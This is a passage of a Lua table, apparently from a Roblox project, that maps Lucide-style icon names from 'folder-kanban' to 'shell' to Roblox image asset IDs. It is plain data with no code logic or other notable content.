	["folder-kanban"] = "rbxassetid://78313285104072",
	["folder-key"] = "rbxassetid://85270407596791",
	["folder-lock"] = "rbxassetid://119201572260567",
	["folder-minus"] = "rbxassetid://85648718999010",
	["folder-open-dot"] = "rbxassetid://74741494767354",
	["folder-open"] = "rbxassetid://76018996254888",
	["folder-output"] = "rbxassetid://101532447937612",
	["folder-pen"] = "rbxassetid://112770491173911",
	["folder-plus"] = "rbxassetid://91865663406119",
	["folder-root"] = "rbxassetid://103333751154693",
	["folder-search-2"] = "rbxassetid://71276453442655",
	["folder-search"] = "rbxassetid://110568075123861",
	["folder-symlink"] = "rbxassetid://127485747227189",
	["folder-sync"] = "rbxassetid://91544602659796",
	["folder-tree"] = "rbxassetid://85577554337861",
	["folder-up"] = "rbxassetid://72008269765857",
	["folder-x"] = "rbxassetid://91699618247635",
	["folder"] = "rbxassetid://80846616596607",
	["folders"] = "rbxassetid://110351216219061",
	["footprints"] = "rbxassetid://139192589041315",
	["forklift"] = "rbxassetid://72030930983101",
	["forward"] = "rbxassetid://97545944739523",
	["frame"] = "rbxassetid://109080612832751",
	["framer"] = "rbxassetid://108384807262391",
	["frown"] = "rbxassetid://124407301067982",
	["fuel"] = "rbxassetid://106447647274511",
	["fullscreen"] = "rbxassetid://77793665526178",
	["funnel-plus"] = "rbxassetid://100780233821928",
	["funnel-x"] = "rbxassetid://70984385812555",
	["funnel"] = "rbxassetid://108829540827529",
	["gallery-horizontal-end"] = "rbxassetid://74672430161161",
	["gallery-horizontal"] = "rbxassetid://80004001442122",
	["gallery-thumbnails"] = "rbxassetid://136219289862706",
	["gallery-vertical-end"] = "rbxassetid://106461402088317",
	["gallery-vertical"] = "rbxassetid://119299431466725",
	["gamepad-2"] = "rbxassetid://92483947987410",
	["gamepad-directional"] = "rbxassetid://84342305212226",
	["gamepad"] = "rbxassetid://121607283959010",
	["gauge"] = "rbxassetid://110273524101447",
	["gavel"] = "rbxassetid://78952298198456",
	["gem"] = "rbxassetid://112904952151156",
	["georgian-lari"] = "rbxassetid://98084432591687",
	["ghost"] = "rbxassetid://113822048130017",
	["gift"] = "rbxassetid://109855212076373",
	["git-branch-minus"] = "rbxassetid://97385010649411",
	["git-branch-plus"] = "rbxassetid://125944221134316",
	["git-branch"] = "rbxassetid://90490195516649",
	["git-commit-horizontal"] = "rbxassetid://133646041800147",
	["git-commit-vertical"] = "rbxassetid://122098032990350",
	["git-compare-arrows"] = "rbxassetid://84874426520216",
	["git-compare"] = "rbxassetid://91945124438792",
	["git-fork"] = "rbxassetid://89954992404765",
	["git-graph"] = "rbxassetid://86166832019304",
	["git-merge"] = "rbxassetid://131833355158059",
	["git-pull-request-arrow"] = "rbxassetid://94507974577439",
	["git-pull-request-closed"] = "rbxassetid://78070600389091",
	["git-pull-request-create-arrow"] = "rbxassetid://127422677061091",
	["git-pull-request-create"] = "rbxassetid://105929577383926",
	["git-pull-request-draft"] = "rbxassetid://76173459869943",
	["git-pull-request"] = "rbxassetid://138463010991471",
	["github"] = "rbxassetid://120349554354380",
	["gitlab"] = "rbxassetid://114054627192933",
	["glass-water"] = "rbxassetid://115526102400988",
	["glasses"] = "rbxassetid://87936407455373",
	["globe-lock"] = "rbxassetid://134065526704402",
	["globe"] = "rbxassetid://114238209622913",
	["goal"] = "rbxassetid://120517954878160",
	["gpu"] = "rbxassetid://95577823614219",
	["graduation-cap"] = "rbxassetid://93771896340220",
	["grape"] = "rbxassetid://134760640415561",
	["grid-2x2-check"] = "rbxassetid://138468840220821",
	["grid-2x2-plus"] = "rbxassetid://91811610580247",
	["grid-2x2-x"] = "rbxassetid://72407303981388",
	["grid-2x2"] = "rbxassetid://99050491897640",
	["grid-3x2"] = "rbxassetid://95528684210010",
	["grid-3x3"] = "rbxassetid://70419024781206",
	["grip-horizontal"] = "rbxassetid://136255899715930",
	["grip-vertical"] = "rbxassetid://137183678565296",
	["grip"] = "rbxassetid://109058783556768",
	["group"] = "rbxassetid://107643418926671",
	["guitar"] = "rbxassetid://75915531867926",
	["ham"] = "rbxassetid://74465607934635",
	["hamburger"] = "rbxassetid://93086916815495",
	["hammer"] = "rbxassetid://83545120140895",
	["hand-coins"] = "rbxassetid://126990543175462",
	["hand-fist"] = "rbxassetid://83341608917591",
	["hand-grab"] = "rbxassetid://88867162163985",
	["hand-heart"] = "rbxassetid://117507367668412",
	["hand-helping"] = "rbxassetid://89897738419446",
	["hand-metal"] = "rbxassetid://113619498548713",
	["hand-platter"] = "rbxassetid://88594727743168",
	["hand"] = "rbxassetid://130703864968637",
	["handbag"] = "rbxassetid://135675846264061",
	["handshake"] = "rbxassetid://78442115255814",
	["hard-drive-download"] = "rbxassetid://73913801230614",
	["hard-drive-upload"] = "rbxassetid://85762133615118",
	["hard-drive"] = "rbxassetid://88183305858463",
	["hard-hat"] = "rbxassetid://128050846767382",
	["hash"] = "rbxassetid://82890331678520",
	["hat-glasses"] = "rbxassetid://101165538224815",
	["haze"] = "rbxassetid://108857561768901",
	["hdmi-port"] = "rbxassetid://103693661037020",
	["heading-1"] = "rbxassetid://118129315662110",
	["heading-2"] = "rbxassetid://110209069670094",
	["heading-3"] = "rbxassetid://90267885237062",
	["heading-4"] = "rbxassetid://129625620307602",
	["heading-5"] = "rbxassetid://120386663181267",
	["heading-6"] = "rbxassetid://90959079775093",
	["heading"] = "rbxassetid://129254312067735",
	["headphone-off"] = "rbxassetid://85038251615641",
	["headphones"] = "rbxassetid://118833729589183",
	["headset"] = "rbxassetid://129269236787694",
	["heart-crack"] = "rbxassetid://110987638564119",
	["heart-handshake"] = "rbxassetid://111483078692002",
	["heart-minus"] = "rbxassetid://96827380163326",
	["heart-off"] = "rbxassetid://89748414415617",
	["heart-plus"] = "rbxassetid://94877796283249",
	["heart-pulse"] = "rbxassetid://129352925579546",
	["heart"] = "rbxassetid://116559368303288",
	["heater"] = "rbxassetid://140478466880916",
	["helicopter"] = "rbxassetid://111557171735930",
	["hexagon"] = "rbxassetid://127592089339199",
	["highlighter"] = "rbxassetid://77411555641113",
	["history"] = "rbxassetid://123980022019922",
	["hop-off"] = "rbxassetid://103386036934034",
	["hop"] = "rbxassetid://82778923997672",
	["hospital"] = "rbxassetid://105868763850707",
	["hotel"] = "rbxassetid://132283390859718",
	["hourglass"] = "rbxassetid://86160434939203",
	["house-heart"] = "rbxassetid://136054771868597",
	["house-plug"] = "rbxassetid://71438263712075",
	["house-plus"] = "rbxassetid://118495165208309",
	["house-wifi"] = "rbxassetid://126495519725698",
	["house"] = "rbxassetid://98755624629571",
	["ice-cream-bowl"] = "rbxassetid://124867218454386",
	["ice-cream-cone"] = "rbxassetid://90751397288639",
	["id-card-lanyard"] = "rbxassetid://90761480469224",
	["id-card"] = "rbxassetid://75354294622640",
	["image-down"] = "rbxassetid://78972295741235",
	["image-minus"] = "rbxassetid://101066016918565",
	["image-off"] = "rbxassetid://81934811700938",
	["image-play"] = "rbxassetid://129501806784210",
	["image-plus"] = "rbxassetid://70391970623917",
	["image-up"] = "rbxassetid://126610009605241",
	["image-upscale"] = "rbxassetid://106963545024679",
	["images"] = "rbxassetid://79350649395557",
	["import"] = "rbxassetid://116545008906029",
	["inbox"] = "rbxassetid://112591360302868",
	["indian-rupee"] = "rbxassetid://113038778381805",
	["infinity"] = "rbxassetid://98083086936965",
	["info"] = "rbxassetid://124560466474914",
	["inspection-panel"] = "rbxassetid://70905313146088",
	["instagram"] = "rbxassetid://119864798614855",
	["italic"] = "rbxassetid://96220378864282",
	["iteration-ccw"] = "rbxassetid://140221832794083",
	["iteration-cw"] = "rbxassetid://95534489554662",
	["japanese-yen"] = "rbxassetid://106362863465813",
	["joystick"] = "rbxassetid://99416790224739",
	["kanban"] = "rbxassetid://125934100055431",
	["kayak"] = "rbxassetid://136107544609389",
	["key-round"] = "rbxassetid://83619031955390",
	["key-square"] = "rbxassetid://94621420033649",
	["key"] = "rbxassetid://96510194465420",
	["keyboard-music"] = "rbxassetid://121058541758636",
	["keyboard-off"] = "rbxassetid://92466375369772",
	["keyboard"] = "rbxassetid://121474456068237",
	["lamp-ceiling"] = "rbxassetid://80032758469141",
	["lamp-desk"] = "rbxassetid://85290686983238",
	["lamp-floor"] = "rbxassetid://104585881375892",
	["lamp-wall-down"] = "rbxassetid://91271394132073",
	["lamp-wall-up"] = "rbxassetid://132141464337445",
	["lamp"] = "rbxassetid://110730830653382",
	["land-plot"] = "rbxassetid://96449039620294",
	["landmark"] = "rbxassetid://76885079756393",
	["languages"] = "rbxassetid://90816903776498",
	["laptop-minimal-check"] = "rbxassetid://114352019833865",
	["laptop-minimal"] = "rbxassetid://136705765566068",
	["laptop"] = "rbxassetid://111387063244975",
	["lasso-select"] = "rbxassetid://105609719912753",
	["lasso"] = "rbxassetid://121072936884007",
	["laugh"] = "rbxassetid://104491311361166",
	["layers-2"] = "rbxassetid://70536710516357",
	["layers"] = "rbxassetid://81973586053257",
	["layout-dashboard"] = "rbxassetid://139929981863901",
	["layout-grid"] = "rbxassetid://81344910161871",
	["layout-list"] = "rbxassetid://87462136296578",
	["layout-panel-left"] = "rbxassetid://125092469751491",
	["layout-panel-top"] = "rbxassetid://91943941515944",
	["layout-template"] = "rbxassetid://115564446417985",
	["leaf"] = "rbxassetid://119951075637174",
	["leafy-green"] = "rbxassetid://105146290493154",
	["lectern"] = "rbxassetid://106166425183862",
	["library-big"] = "rbxassetid://106794530191412",
	["library"] = "rbxassetid://114334671982047",
	["life-buoy"] = "rbxassetid://81168450671956",
	["ligature"] = "rbxassetid://111397873269411",
	["lightbulb-off"] = "rbxassetid://83795722296178",
	["lightbulb"] = "rbxassetid://103871245626488",
	["line-squiggle"] = "rbxassetid://109555164424447",
	["link-2-off"] = "rbxassetid://76885956296867",
	["link-2"] = "rbxassetid://86072351557466",
	["link"] = "rbxassetid://131607023382430",
	["linkedin"] = "rbxassetid://132842789255788",
	["list-check"] = "rbxassetid://72374358471156",
	["list-checks"] = "rbxassetid://99809353635593",
	["list-chevrons-down-up"] = "rbxassetid://137409641500711",
	["list-chevrons-up-down"] = "rbxassetid://81825351389084",
	["list-collapse"] = "rbxassetid://124505247702401",
	["list-end"] = "rbxassetid://77650610048119",
	["list-filter-plus"] = "rbxassetid://96385120752336",
	["list-filter"] = "rbxassetid://103321376129527",
	["list-indent-decrease"] = "rbxassetid://137879979228193",
	["list-indent-increase"] = "rbxassetid://79051053161201",
	["list-minus"] = "rbxassetid://138507965142671",
	["list-music"] = "rbxassetid://126380635781840",
	["list-ordered"] = "rbxassetid://83212528113913",
	["list-plus"] = "rbxassetid://112384738137814",
	["list-restart"] = "rbxassetid://91703153577421",
	["list-start"] = "rbxassetid://84828348299727",
	["list-todo"] = "rbxassetid://132980603752108",
	["list-tree"] = "rbxassetid://97685396239010",
	["list-video"] = "rbxassetid://93648525452489",
	["list-x"] = "rbxassetid://113025303988861",
	["list"] = "rbxassetid://113179976918783",
	["loader-circle"] = "rbxassetid://116535712789945",
	["loader-pinwheel"] = "rbxassetid://108513357940900",
	["loader"] = "rbxassetid://78408734580845",
	["locate-fixed"] = "rbxassetid://137367361548433",
	["locate-off"] = "rbxassetid://73729216338137",
	["locate"] = "rbxassetid://84467676590391",
	["lock-keyhole-open"] = "rbxassetid://110863509313073",
	["lock-keyhole"] = "rbxassetid://78672912777756",
	["lock-open"] = "rbxassetid://93597915325122",
	["lock"] = "rbxassetid://134724289526879",
	["log-in"] = "rbxassetid://103768533135201",
	["log-out"] = "rbxassetid://84895399304975",
	["logs"] = "rbxassetid://89772091251787",
	["lollipop"] = "rbxassetid://84681611583044",
	["luggage"] = "rbxassetid://76619236486400",
	["magnet"] = "rbxassetid://135162361226972",
	["mail-check"] = "rbxassetid://86921536259917",
	["mail-minus"] = "rbxassetid://81989813236553",
	["mail-open"] = "rbxassetid://122785416858638",
	["mail-plus"] = "rbxassetid://104886401588341",
	["mail-question-mark"] = "rbxassetid://126540170949819",
	["mail-search"] = "rbxassetid://135616173775287",
	["mail-warning"] = "rbxassetid://81495303676089",
	["mail-x"] = "rbxassetid://74607841705644",
	["mail"] = "rbxassetid://103945161245599",
	["mailbox"] = "rbxassetid://82765503320335",
	["mails"] = "rbxassetid://90673453450080",
	["map-minus"] = "rbxassetid://129525760577747",
	["map-pin-check-inside"] = "rbxassetid://107130529843809",
	["map-pin-check"] = "rbxassetid://118110914690154",
	["map-pin-house"] = "rbxassetid://80546885029816",
	["map-pin-minus-inside"] = "rbxassetid://79005529692964",
	["map-pin-minus"] = "rbxassetid://74518762643623",
	["map-pin-off"] = "rbxassetid://82474689391020",
	["map-pin-pen"] = "rbxassetid://113515395277504",
	["map-pin-plus-inside"] = "rbxassetid://134639656514430",
	["map-pin-plus"] = "rbxassetid://91875228967029",
	["map-pin-x-inside"] = "rbxassetid://126235934252379",
	["map-pin-x"] = "rbxassetid://101085273547316",
	["map-pin"] = "rbxassetid://84279202219901",
	["map-pinned"] = "rbxassetid://103963788475034",
	["map-plus"] = "rbxassetid://129388826743495",
	["map"] = "rbxassetid://95107167260947",
	["mars-stroke"] = "rbxassetid://131973193186828",
	["mars"] = "rbxassetid://111287112372511",
	["martini"] = "rbxassetid://82977695401058",
	["maximize-2"] = "rbxassetid://73085922906397",
	["maximize"] = "rbxassetid://76045941763188",
	["medal"] = "rbxassetid://79016002264450",
	["megaphone-off"] = "rbxassetid://124280774193935",
	["megaphone"] = "rbxassetid://118759541854879",
	["meh"] = "rbxassetid://132197867028557",
	["memory-stick"] = "rbxassetid://93212591343119",
	["menu"] = "rbxassetid://77021539815611",
	["merge"] = "rbxassetid://126201866476775",
	["message-circle-code"] = "rbxassetid://112865244991651",
	["message-circle-dashed"] = "rbxassetid://81525157881897",
	["message-circle-heart"] = "rbxassetid://101990756073677",
	["message-circle-more"] = "rbxassetid://92856823884663",
	["message-circle-off"] = "rbxassetid://134955643890328",
	["message-circle-plus"] = "rbxassetid://106562979649273",
	["message-circle-question-mark"] = "rbxassetid://107700302759934",
	["message-circle-reply"] = "rbxassetid://137071749508334",
	["message-circle-warning"] = "rbxassetid://119020096067894",
	["message-circle-x"] = "rbxassetid://126843387725536",
	["message-circle"] = "rbxassetid://127255077587058",
	["message-square-code"] = "rbxassetid://110968863152123",
	["message-square-dashed"] = "rbxassetid://107653455516238",
	["message-square-diff"] = "rbxassetid://75472190472625",
	["message-square-dot"] = "rbxassetid://127806382463916",
	["message-square-heart"] = "rbxassetid://75612811742074",
	["message-square-lock"] = "rbxassetid://81268215619563",
	["message-square-more"] = "rbxassetid://120139782405970",
	["message-square-off"] = "rbxassetid://99961019005789",
	["message-square-plus"] = "rbxassetid://76934450256199",
	["message-square-quote"] = "rbxassetid://116670768629340",
	["message-square-reply"] = "rbxassetid://130985622754637",
	["message-square-share"] = "rbxassetid://131017005324026",
	["message-square-text"] = "rbxassetid://94899503194205",
	["message-square-warning"] = "rbxassetid://138432903962261",
	["message-square-x"] = "rbxassetid://137285463279462",
	["message-square"] = "rbxassetid://83881670383280",
	["messages-square"] = "rbxassetid://97532166733358",
	["mic-off"] = "rbxassetid://82123034444822",
	["mic-vocal"] = "rbxassetid://99082286164362",
	["mic"] = "rbxassetid://89640799126523",
	["microchip"] = "rbxassetid://73937907669903",
	["microscope"] = "rbxassetid://116875530102782",
	["microwave"] = "rbxassetid://108411735353008",
	["milestone"] = "rbxassetid://101618292325920",
	["milk-off"] = "rbxassetid://72388480962742",
	["milk"] = "rbxassetid://96221903896918",
	["minimize-2"] = "rbxassetid://116269596042539",
	["minimize"] = "rbxassetid://121304296213645",
	["minus"] = "rbxassetid://118026365011536",
	["monitor-check"] = "rbxassetid://86651948439229",
	["monitor-cloud"] = "rbxassetid://85931096038318",
	["monitor-cog"] = "rbxassetid://94345128715799",
	["monitor-dot"] = "rbxassetid://130394010063680",
	["monitor-down"] = "rbxassetid://97466933743423",
	["monitor-off"] = "rbxassetid://74395526657953",
	["monitor-pause"] = "rbxassetid://76002184067562",
	["monitor-play"] = "rbxassetid://133018824306217",
	["monitor-smartphone"] = "rbxassetid://84335680433378",
	["monitor-speaker"] = "rbxassetid://81744810060380",
	["monitor-stop"] = "rbxassetid://98708958984757",
	["monitor-up"] = "rbxassetid://96035360858377",
	["monitor-x"] = "rbxassetid://126265210441423",
	["monitor"] = "rbxassetid://72664649203050",
	["moon-star"] = "rbxassetid://82782200506348",
	["moon"] = "rbxassetid://83380517901735",
	["motorbike"] = "rbxassetid://94580787368233",
	["mountain-snow"] = "rbxassetid://105315495740588",
	["mountain"] = "rbxassetid://73269957566415",
	["mouse-off"] = "rbxassetid://75267871697595",
	["mouse-pointer-2-off"] = "rbxassetid://104701076865632",
	["mouse-pointer-2"] = "rbxassetid://117093892862228",
	["mouse-pointer-ban"] = "rbxassetid://106849413057133",
	["mouse-pointer-click"] = "rbxassetid://107150227368485",
	["mouse-pointer"] = "rbxassetid://72322454962935",
	["mouse"] = "rbxassetid://73096068864710",
	["move-3d"] = "rbxassetid://103365982054003",
	["move-diagonal-2"] = "rbxassetid://117298577948096",
	["move-diagonal"] = "rbxassetid://101433481954184",
	["move-down-left"] = "rbxassetid://102819433534567",
	["move-down-right"] = "rbxassetid://101479760041877",
	["move-down"] = "rbxassetid://70510115135583",
	["move-horizontal"] = "rbxassetid://88513523439149",
	["move-left"] = "rbxassetid://137614740247980",
	["move-right"] = "rbxassetid://132455779472989",
	["move-up-left"] = "rbxassetid://139079815540148",
	["move-up-right"] = "rbxassetid://105885140592646",
	["move-up"] = "rbxassetid://84505444262658",
	["move-vertical"] = "rbxassetid://86234730730899",
	["move"] = "rbxassetid://116138709011735",
	["music-2"] = "rbxassetid://134397426600888",
	["music-3"] = "rbxassetid://94466120066498",
	["music-4"] = "rbxassetid://132459323665838",
	["music"] = "rbxassetid://113343203848535",
	["navigation-2-off"] = "rbxassetid://116569611780763",
	["navigation-2"] = "rbxassetid://81889066747907",
	["navigation-off"] = "rbxassetid://87003270290777",
	["navigation"] = "rbxassetid://79308213542922",
	["network"] = "rbxassetid://127410729922644",
	["newspaper"] = "rbxassetid://123479530460544",
	["nfc"] = "rbxassetid://76822396542242",
	["non-binary"] = "rbxassetid://78442360386235",
	["notebook-pen"] = "rbxassetid://140380614761023",
	["notebook-tabs"] = "rbxassetid://127371085570083",
	["notebook-text"] = "rbxassetid://93061585217270",
	["notebook"] = "rbxassetid://136132108664987",
	["notepad-text-dashed"] = "rbxassetid://135793446376219",
	["notepad-text"] = "rbxassetid://93404682958966",
	["nut-off"] = "rbxassetid://78795397311573",
	["nut"] = "rbxassetid://127146410705656",
	["octagon-alert"] = "rbxassetid://140438367956051",
	["octagon-minus"] = "rbxassetid://74720436795421",
	["octagon-pause"] = "rbxassetid://103161463909039",
	["octagon-x"] = "rbxassetid://90498161006311",
	["octagon"] = "rbxassetid://120803515514852",
	["omega"] = "rbxassetid://70414080018786",
	["option"] = "rbxassetid://100776883894054",
	["orbit"] = "rbxassetid://108926136860562",
	["origami"] = "rbxassetid://136020626667101",
	["package-2"] = "rbxassetid://70394974762575",
	["package-check"] = "rbxassetid://102374216055130",
	["package-minus"] = "rbxassetid://114492858789692",
	["package-open"] = "rbxassetid://132890233237818",
	["package-plus"] = "rbxassetid://129261988138366",
	["package-search"] = "rbxassetid://95465120894145",
	["package-x"] = "rbxassetid://70818501607442",
	["package"] = "rbxassetid://97261141732706",
	["paint-bucket"] = "rbxassetid://124275586663284",
	["paint-roller"] = "rbxassetid://115248074358348",
	["paintbrush-vertical"] = "rbxassetid://105151296591292",
	["paintbrush"] = "rbxassetid://125572663700289",
	["palette"] = "rbxassetid://86350350950064",
	["panda"] = "rbxassetid://132509022802512",
	["panel-bottom-close"] = "rbxassetid://74287004071159",
	["panel-bottom-dashed"] = "rbxassetid://131084651621603",
	["panel-bottom-open"] = "rbxassetid://107768659586540",
	["panel-bottom"] = "rbxassetid://132127145048511",
	["panel-left-close"] = "rbxassetid://126579818823552",
	["panel-left-dashed"] = "rbxassetid://75536606374585",
	["panel-left-open"] = "rbxassetid://111075816195767",
	["panel-left-right-dashed"] = "rbxassetid://110100707973959",
	["panel-left"] = "rbxassetid://97419752870313",
	["panel-right-close"] = "rbxassetid://139528655524132",
	["panel-right-dashed"] = "rbxassetid://94959793877311",
	["panel-right-open"] = "rbxassetid://118114419142794",
	["panel-right"] = "rbxassetid://116365035443156",
	["panel-top-bottom-dashed"] = "rbxassetid://134737235653344",
	["panel-top-close"] = "rbxassetid://83578325777808",
	["panel-top-dashed"] = "rbxassetid://70522913169237",
	["panel-top-open"] = "rbxassetid://137959875507454",
	["panel-top"] = "rbxassetid://75838479462875",
	["panels-left-bottom"] = "rbxassetid://72996856149149",
	["panels-right-bottom"] = "rbxassetid://90659068960726",
	["panels-top-left"] = "rbxassetid://79858853850600",
	["paperclip"] = "rbxassetid://92088291163453",
	["parentheses"] = "rbxassetid://78950955173096",
	["parking-meter"] = "rbxassetid://84652733960568",
	["party-popper"] = "rbxassetid://111626795712193",
	["pause"] = "rbxassetid://74873705394436",
	["paw-print"] = "rbxassetid://112218825427601",
	["pc-case"] = "rbxassetid://122978648019101",
	["pen-line"] = "rbxassetid://109108135755303",
	["pen-off"] = "rbxassetid://84807123119438",
	["pen-tool"] = "rbxassetid://106145404953445",
	["pen"] = "rbxassetid://72037878096321",
	["pencil-line"] = "rbxassetid://88392917053533",
	["pencil-off"] = "rbxassetid://103330927652832",
	["pencil-ruler"] = "rbxassetid://110120288284597",
	["pencil"] = "rbxassetid://137986121120732",
	["pentagon"] = "rbxassetid://79184802179890",
	["percent"] = "rbxassetid://130155041032013",
	["person-standing"] = "rbxassetid://125020872044147",
	["philippine-peso"] = "rbxassetid://91173798254675",
	["phone-call"] = "rbxassetid://70555587592860",
	["phone-forwarded"] = "rbxassetid://113269614319737",
	["phone-incoming"] = "rbxassetid://82863576359288",
	["phone-missed"] = "rbxassetid://130156165198376",
	["phone-off"] = "rbxassetid://133318623553383",
	["phone-outgoing"] = "rbxassetid://104576478735825",
	["phone"] = "rbxassetid://128804946640049",
	["pi"] = "rbxassetid://74936036243146",
	["piano"] = "rbxassetid://85008880789520",
	["pickaxe"] = "rbxassetid://105888023317688",
	["picture-in-picture-2"] = "rbxassetid://112803319544468",
	["picture-in-picture"] = "rbxassetid://80579597835123",
	["piggy-bank"] = "rbxassetid://79498575790721",
	["pilcrow-left"] = "rbxassetid://103803000849583",
	["pilcrow-right"] = "rbxassetid://104881733911870",
	["pilcrow"] = "rbxassetid://139512780392871",
	["pill-bottle"] = "rbxassetid://118394692404597",
	["pill"] = "rbxassetid://73280534813448",
	["pin-off"] = "rbxassetid://127696372451750",
	["pin"] = "rbxassetid://120978111007514",
	["pipette"] = "rbxassetid://133167932934404",
	["pizza"] = "rbxassetid://126964453193501",
	["plane-landing"] = "rbxassetid://122555692211889",
	["plane-takeoff"] = "rbxassetid://117179478829575",
	["plane"] = "rbxassetid://126985561580989",
	["play"] = "rbxassetid://135609604299893",
	["plug-2"] = "rbxassetid://97912386476366",
	["plug-zap"] = "rbxassetid://74506269884055",
	["plug"] = "rbxassetid://99782373064495",
	["plus"] = "rbxassetid://111774323017047",
	["pocket-knife"] = "rbxassetid://134075428063965",
	["pocket"] = "rbxassetid://136686762542964",
	["podcast"] = "rbxassetid://109577075549215",
	["pointer-off"] = "rbxassetid://95488389312794",
	["pointer"] = "rbxassetid://92615117311099",
	["popcorn"] = "rbxassetid://139446511232750",
	["popsicle"] = "rbxassetid://112696318077073",
	["pound-sterling"] = "rbxassetid://127482649469130",
	["power-off"] = "rbxassetid://118768311012214",
	["power"] = "rbxassetid://96479131758775",
	["presentation"] = "rbxassetid://106134583757890",
	["printer-check"] = "rbxassetid://130273549443689",
	["printer"] = "rbxassetid://76080649734247",
	["projector"] = "rbxassetid://103281856385283",
	["proportions"] = "rbxassetid://130046855997237",
	["puzzle"] = "rbxassetid://136837798892463",
	["pyramid"] = "rbxassetid://107811442374127",
	["qr-code"] = "rbxassetid://105329945723350",
	["quote"] = "rbxassetid://103271711590001",
	["rabbit"] = "rbxassetid://98580518804206",
	["radar"] = "rbxassetid://138528222906635",
	["radiation"] = "rbxassetid://104499586848433",
	["radical"] = "rbxassetid://132758286926047",
	["radio-receiver"] = "rbxassetid://129598303378835",
	["radio-tower"] = "rbxassetid://93958663130054",
	["radio"] = "rbxassetid://85611589536956",
	["radius"] = "rbxassetid://89814505307129",
	["rail-symbol"] = "rbxassetid://134295386306962",
	["rainbow"] = "rbxassetid://132488862841895",
	["rat"] = "rbxassetid://127400975953159",
	["ratio"] = "rbxassetid://126369423897295",
	["receipt-cent"] = "rbxassetid://91557573925201",
	["receipt-euro"] = "rbxassetid://94015722210295",
	["receipt-indian-rupee"] = "rbxassetid://89718170439990",
	["receipt-japanese-yen"] = "rbxassetid://132472560758851",
	["receipt-pound-sterling"] = "rbxassetid://73934967569625",
	["receipt-russian-ruble"] = "rbxassetid://105164576936853",
	["receipt-swiss-franc"] = "rbxassetid://72503668620116",
	["receipt-text"] = "rbxassetid://138483536013737",
	["receipt-turkish-lira"] = "rbxassetid://91950765836342",
	["receipt"] = "rbxassetid://77877895901792",
	["rectangle-circle"] = "rbxassetid://100642423153903",
	["rectangle-ellipsis"] = "rbxassetid://112919953980965",
	["rectangle-goggles"] = "rbxassetid://98605436666727",
	["rectangle-horizontal"] = "rbxassetid://90224199814966",
	["rectangle-vertical"] = "rbxassetid://117277050590967",
	["recycle"] = "rbxassetid://140417023381961",
	["redo-2"] = "rbxassetid://70451039017914",
	["redo-dot"] = "rbxassetid://94252981719732",
	["redo"] = "rbxassetid://116150342119054",
	["refresh-ccw-dot"] = "rbxassetid://106702246753270",
	["refresh-ccw"] = "rbxassetid://117913330389477",
	["refresh-cw-off"] = "rbxassetid://140179498843054",
	["refresh-cw"] = "rbxassetid://138133190015277",
	["refrigerator"] = "rbxassetid://102614042652753",
	["regex"] = "rbxassetid://100727200791841",
	["remove-formatting"] = "rbxassetid://112833162022628",
	["repeat-1"] = "rbxassetid://130144534857095",
	["repeat-2"] = "rbxassetid://85927537182704",
	["repeat"] = "rbxassetid://121886242955173",
	["replace-all"] = "rbxassetid://127862728198635",
	["replace"] = "rbxassetid://128404082279430",
	["reply-all"] = "rbxassetid://71723137343562",
	["reply"] = "rbxassetid://109788633497028",
	["rewind"] = "rbxassetid://95205297521988",
	["ribbon"] = "rbxassetid://94265331526851",
	["rocket"] = "rbxassetid://87412317685854",
	["rocking-chair"] = "rbxassetid://110420269495360",
	["roller-coaster"] = "rbxassetid://112426178972099",
	["rose"] = "rbxassetid://126336840238769",
	["rotate-3d"] = "rbxassetid://76300551576392",
	["rotate-ccw-key"] = "rbxassetid://74976035240976",
	["rotate-ccw-square"] = "rbxassetid://90515853170424",
	["rotate-ccw"] = "rbxassetid://110116685948665",
	["rotate-cw-square"] = "rbxassetid://77095448159303",
	["rotate-cw"] = "rbxassetid://84183336178654",
	["route-off"] = "rbxassetid://106350402024079",
	["route"] = "rbxassetid://89968303228953",
	["router"] = "rbxassetid://102130331994471",
	["rows-2"] = "rbxassetid://112556185960101",
	["rows-3"] = "rbxassetid://117215586961375",
	["rows-4"] = "rbxassetid://125646021959055",
	["rss"] = "rbxassetid://131789058984793",
	["ruler-dimension-line"] = "rbxassetid://70673861371412",
	["ruler"] = "rbxassetid://81432445547423",
	["russian-ruble"] = "rbxassetid://126357936542156",
	["sailboat"] = "rbxassetid://87110567187540",
	["salad"] = "rbxassetid://128864507821603",
	["sandwich"] = "rbxassetid://104573187458917",
	["satellite-dish"] = "rbxassetid://136742443888305",
	["satellite"] = "rbxassetid://134967053164645",
	["saudi-riyal"] = "rbxassetid://102282769104635",
	["save-all"] = "rbxassetid://116946975799440",
	["save-off"] = "rbxassetid://87085435778560",
	["save"] = "rbxassetid://126116963775616",
	["scale-3d"] = "rbxassetid://72414199620352",
	["scale"] = "rbxassetid://108203682317477",
	["scaling"] = "rbxassetid://122360365318466",
	["scan-barcode"] = "rbxassetid://96889457154761",
	["scan-eye"] = "rbxassetid://99244790601968",
	["scan-face"] = "rbxassetid://109959345069668",
	["scan-heart"] = "rbxassetid://106280819776142",
	["scan-line"] = "rbxassetid://126544908146540",
	["scan-qr-code"] = "rbxassetid://105409149549927",
	["scan-search"] = "rbxassetid://80009010551347",
	["scan-text"] = "rbxassetid://73702396787766",
	["scan"] = "rbxassetid://123104789658180",
	["school"] = "rbxassetid://76351530290068",
	["scissors-line-dashed"] = "rbxassetid://122237447974173",
	["scissors"] = "rbxassetid://118665510911274",
	["screen-share-off"] = "rbxassetid://107677572669805",
	["screen-share"] = "rbxassetid://85137895705653",
	["scroll-text"] = "rbxassetid://97321022666868",
	["scroll"] = "rbxassetid://74072101474951",
	["search-check"] = "rbxassetid://75442076191356",
	["search-code"] = "rbxassetid://117114794592802",
	["search-slash"] = "rbxassetid://96483932261041",
	["search-x"] = "rbxassetid://137319957522951",
	["search"] = "rbxassetid://121018724060431",
	["section"] = "rbxassetid://91732188298948",
	["send-horizontal"] = "rbxassetid://111734392411664",
	["send-to-back"] = "rbxassetid://75340312862253",
	["send"] = "rbxassetid://127751956873796",
	["separator-horizontal"] = "rbxassetid://84864453699927",
	["separator-vertical"] = "rbxassetid://84031801478581",
	["server-cog"] = "rbxassetid://138470287250966",
	["server-crash"] = "rbxassetid://132810618000212",
	["server-off"] = "rbxassetid://114048751507723",
	["server"] = "rbxassetid://92188766517878",
	["settings-2"] = "rbxassetid://135684703553372",
	["settings"] = "rbxassetid://80758916183665",
	["shapes"] = "rbxassetid://129989433311409",
	["share-2"] = "rbxassetid://71210767962065",
	["share"] = "rbxassetid://87340985053299",
	["sheet"] = "rbxassetid://134902122480171",
	["shell"] = "rbxassetid://140212943563599",
